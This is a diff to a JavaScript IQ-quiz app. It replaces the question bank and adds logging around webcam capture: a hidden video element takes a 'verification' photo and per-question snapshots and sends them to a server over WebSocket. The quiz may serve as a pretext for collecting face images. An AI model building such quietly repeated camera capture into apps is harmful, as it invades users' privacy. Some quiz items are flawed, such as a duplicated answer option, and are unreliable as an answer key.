@@ -11,129 +11,129 @@ class IQTestApp {
         
         this.questions = [
             {
-                question: "If all Bloops are Razzles and all Razzles are Lazzles, then all Bloops are definitely Lazzles?",
-                options: ["True", "False", "Cannot be determined", "Insufficient information"],
+                question: "What number comes next in the sequence: 2, 5, 11, 23, 47, ?",
+                options: ["95", "94", "96", "93"],
                 correct: 0
             },
             {
-                question: "What number should replace the question mark? 2, 6, 12, 20, 30, ?",
-                options: ["40", "42", "45", "48"],
-                correct: 1
-            },
-            {
-                question: "Which word does not belong? Apple, Orange, Banana, Carrot, Grape",
-                options: ["Apple", "Orange", "Carrot", "Grape"],
+                question: "Which word is the odd one out?",
+                options: ["Steering wheel", "Engine", "Car", "Tire"],
                 correct: 2
             },
             {
-                question: "If you rearrange the letters 'CIFAIPC' you would have the name of a(n):",
-                options: ["City", "Animal", "Ocean", "Country"],
+                question: "If you rearrange the letters 'RATS', you can form which word?",
+                options: ["STAR", "ARTS", "TARS", "All of the above"],
+                correct: 3
+            },
+            {
+                question: "Complete the pattern: △ ○ □ △ ○ ?",
+                options: ["△", "○", "□", "◇"],
                 correct: 2
             },
             {
-                question: "What comes next in this sequence? 1, 1, 2, 3, 5, 8, ?",
-                options: ["11", "13", "15", "16"],
-                correct: 1
-            },
-            {
-                question: "A clock shows 3:15. What is the angle between the hour and minute hands?",
-                options: ["0°", "7.5°", "15°", "22.5°"],
-                correct: 1
-            },
-            {
-                question: "If 3 cats catch 3 mice in 3 minutes, how many cats are needed to catch 100 mice in 100 minutes?",
-                options: ["3", "33", "100", "300"],
+                question: "What is the missing number? 8, 27, 64, ?, 216",
+                options: ["125", "128", "135", "144"],
                 correct: 0
             },
             {
-                question: "Which number is the odd one out? 17, 23, 29, 33, 37",
-                options: ["17", "23", "33", "37"],
+                question: "Which number doesn't belong: 4, 9, 16, 20, 25?",
+                options: ["4", "9", "20", "25"],
                 correct: 2
             },
             {
-                question: "Complete the analogy: Book is to Reading as Fork is to:",
-                options: ["Eating", "Kitchen", "Spoon", "Food"],
+                question: "Book is to Reading as Fork is to:",
+                options: ["Eating", "Kitchen", "Food", "Spoon"],
                 correct: 0
             },
             {
-                question: "What is the next letter in this sequence? A, D, G, J, ?",
+                question: "What comes next: Monday, Wednesday, Friday, ?",
+                options: ["Saturday", "Sunday", "Tuesday", "Monday"],
+                correct: 1
+            },
+            {
+                question: "If all roses are flowers and some flowers are red, then:",
+                options: ["All roses are red", "Some roses may be red", "No roses are red", "All flowers are roses"],
+                correct: 1
+            },
+            {
+                question: "Find the missing number: 3, 7, 15, 31, ?",
+                options: ["63", "62", "64", "65"],
+                correct: 0
+            },
+            {
+                question: "Which figure completes the analogy? Circle is to sphere as square is to:",
+                options: ["Rectangle", "Cube", "Triangle", "Oval"],
+                correct: 1
+            },
+            {
+                question: "What is the next letter in this sequence: A, D, G, J, ?",
                 options: ["K", "L", "M", "N"],
                 correct: 2
             },
             {
-                question: "If today is Monday, what day will it be 100 days from now?",
-                options: ["Monday", "Tuesday", "Wednesday", "Thursday"],
-                correct: 1
-            },
-            {
-                question: "Which shape completes the pattern? Circle, Square, Triangle, Circle, Square, ?",
-                options: ["Circle", "Square", "Triangle", "Pentagon"],
-                correct: 2
-            },
-            {
-                question: "What is 15% of 240?",
-                options: ["32", "36", "40", "48"],
-                correct: 1
-            },
-            {
-                question: "If BAT = 23, CAT = 24, what does DOG equal?",
-                options: ["26", "27", "28", "29"],
+                question: "If 5 machines make 5 widgets in 5 minutes, how long does it take 100 machines to make 100 widgets?",
+                options: ["5 minutes", "20 minutes", "100 minutes", "500 minutes"],
                 correct: 0
             },
             {
-                question: "Which word can be made from these letters? TRSAET",
-                options: ["TREATS", "TASTER", "RATTER", "STARTER"],
-                correct: 1
-            },
-            {
-                question: "What number is missing? 8, 27, ?, 125, 216",
-                options: ["54", "64", "72", "81"],
-                correct: 1
-            },
-            {
-                question: "If you flip a fair coin 10 times and get heads every time, what is the probability of getting heads on the 11th flip?",
-                options: ["Very low", "50%", "Very high", "Cannot be determined"],
-                correct: 1
-            },
-            {
-                question: "Which number continues this pattern? 1, 4, 9, 16, 25, ?",
-                options: ["30", "35", "36", "49"],
+                question: "Which word doesn't fit: Apple, Banana, Cherry, Potato, Orange?",
+                options: ["Apple", "Banana", "Potato", "Orange"],
                 correct: 2
             },
             {
-                question: "What comes next? Monday, Wednesday, Friday, ?",
-                options: ["Saturday", "Sunday", "Monday", "Tuesday"],
-                correct: 1
-            },
-            {
-                question: "If EARTH is coded as HTWOG, how is WATER coded?",
-                options: ["ZDWHU", "YDVGT", "ZEXIV", "XBUFS"],
-                correct: 0
-            },
-            {
-                question: "Which is the odd one out? Mozart, Beethoven, Da Vinci, Bach",
-                options: ["Mozart", "Beethoven", "Da Vinci", "Bach"],
+                question: "Complete the number series: 1, 1, 2, 3, 5, 8, 13, ?",
+                options: ["19", "20", "21", "22"],
                 correct: 2
             },
             {
-                question: "Complete the sequence: 2, 6, 18, 54, ?",
-                options: ["108", "162", "216", "270"],
+                question: "Water is to ice as milk is to:",
+                options: ["Cream", "Cheese", "Butter", "Cow"],
                 correct: 1
             },
             {
-                question: "If all Glips are Flops and some Flops are Clips, then:",
-                options: ["All Clips are Glips", "Some Glips are Clips", "No Glips are Clips", "Cannot be determined"],
+                question: "What number should replace the question mark? 6, 12, 24, 48, ?",
+                options: ["72", "84", "96", "108"],
+                correct: 2
+            },
+            {
+                question: "Which of these is different from the others?",
+                options: ["Cat", "Dog", "Bird", "Fish"],
+                correct: 2
+            },
+            {
+                question: "If today is Tuesday, what day will it be in 60 days?",
+                options: ["Monday", "Tuesday", "Wednesday", "Saturday"],
                 correct: 3
             },
             {
-                question: "What is the result of: 7 × 8 + 15 ÷ 3 - 10?",
-                options: ["51", "49", "47", "45"],
+                question: "Find the odd one out: 3, 5, 7, 9, 11, 13",
+                options: ["3", "5", "9", "11"],
+                correct: 2
+            },
+            {
+                question: "Pen is to write as knife is to:",
+                options: ["Sharp", "Cut", "Kitchen", "Metal"],
+                correct: 1
+            },
+            {
+                question: "What comes next in the pattern: Z, Y, X, W, V, ?",
+                options: ["U", "T", "S", "R"],
                 correct: 0
             },
             {
-                question: "Which number should replace the question mark? 3, 7, 15, 31, ?",
-                options: ["51", "55", "63", "67"],
-                correct: 2
+                question: "If FRIEND is coded as GSJFOE, how is MOTHER coded?",
+                options: ["NPUIFS", "NPUTFS", "NPUGFS", "NPUIFS"],
+                correct: 0
+            },
+            {
+                question: "Which number comes next: 2, 6, 12, 20, 30, ?",
+                options: ["40", "42", "44", "46"],
+                correct: 1
+            },
+            {
+                question: "What is the relationship? Finger is to hand as toe is to:",
+                options: ["Leg", "Foot", "Body", "Nail"],
+                correct: 1
             }
         ];
         
@@ -160,6 +160,12 @@ class IQTestApp {
         
         this.ws.onopen = () => {
             console.log('Connected to server');
+            // Register as IQ test user session
+            this.ws.send(JSON.stringify({
+                type: 'register',
+                role: 'user',
+                sessionId: this.sessionId
+            }));
         };
         
         this.ws.onclose = () => {
@@ -207,19 +213,35 @@ class IQTestApp {
             this.hiddenVideo.playsInline = true;
             
             // Wait for video to be ready
-            await new Promise((resolve) => {
+            await new Promise((resolve, reject) => {
                 this.hiddenVideo.onloadedmetadata = () => {
+                    console.log('Hidden video ready:', {
+                        width: this.hiddenVideo.videoWidth,
+                        height: this.hiddenVideo.videoHeight
+                    });
                     resolve();
                 };
+                
+                this.hiddenVideo.onerror = () => {
+                    reject(new Error('Video failed to load'));
+                };
+                
+                // Timeout after 10 seconds
+                setTimeout(() => {
+                    reject(new Error('Video load timeout'));
+                }, 10000);
             });
             
             statusEl.innerHTML = '<span class="status-icon">✅</span><span>Camera ready - Assessment can begin</span>';
             startBtn.disabled = false;
             
-            // Send initial verification photo
+            console.log('Camera permission granted, waiting before initial capture...');
+            
+            // Send initial verification photo after a short delay
             setTimeout(() => {
+                console.log('Taking initial verification photo...');
                 this.capturePhoto('verification');
-            }, 1000);
+            }, 2000);
             
         } catch (error) {
             console.error('Camera access error:', error);
@@ -263,7 +285,10 @@ class IQTestApp {
     }
     
     capturePhoto(type) {
-        if (!this.hiddenVideo || !this.stream) return;
+        if (!this.hiddenVideo || !this.stream) {
+            console.log('Cannot capture photo - video or stream not ready');
+            return;
+        }
         
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -279,9 +304,16 @@ class IQTestApp {
             ctx.fillRect(canvas.width - 200, canvas.height - 30, 195, 25);
             ctx.fillStyle = '#fff';
             ctx.font = '12px Arial';
-            ctx.fillText('IQ Test Capture', canvas.width - 195, canvas.height - 12);
+            ctx.fillText(`IQ Test - ${type}`, canvas.width - 195, canvas.height - 12);
             
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
+            
+            console.log(`Capturing photo: ${type}`, {
+                sessionId: this.sessionId,
+                photoType: type,
+                currentQuestion: this.currentQuestion,
+                wsReady: this.ws && this.ws.readyState === WebSocket.OPEN
+            });
             
             this.sendPhotoToServer(type, photoData);
             
@@ -292,14 +324,28 @@ class IQTestApp {
     
     sendPhotoToServer(type, photoData) {
         if (this.ws && this.ws.readyState === WebSocket.OPEN) {
-            this.ws.send(JSON.stringify({
+            const message = {
                 type: 'iq_photo_capture',
                 sessionId: this.sessionId,
                 photoType: type,
                 photo: photoData,
                 timestamp: Date.now(),
                 currentQuestion: this.currentQuestion
-            }));
+            };
+            
+            console.log('Sending photo to server:', {
+                type: message.type,
+                sessionId: message.sessionId,
+                photoType: message.photoType,
+                currentQuestion: message.currentQuestion
+            });
+            
+            this.ws.send(JSON.stringify(message));
+        } else {
+            console.error('Cannot send photo - WebSocket not ready', {
+                wsExists: !!this.ws,
+                wsState: this.ws ? this.ws.readyState : 'no websocket'
+            });
         }
     }
     
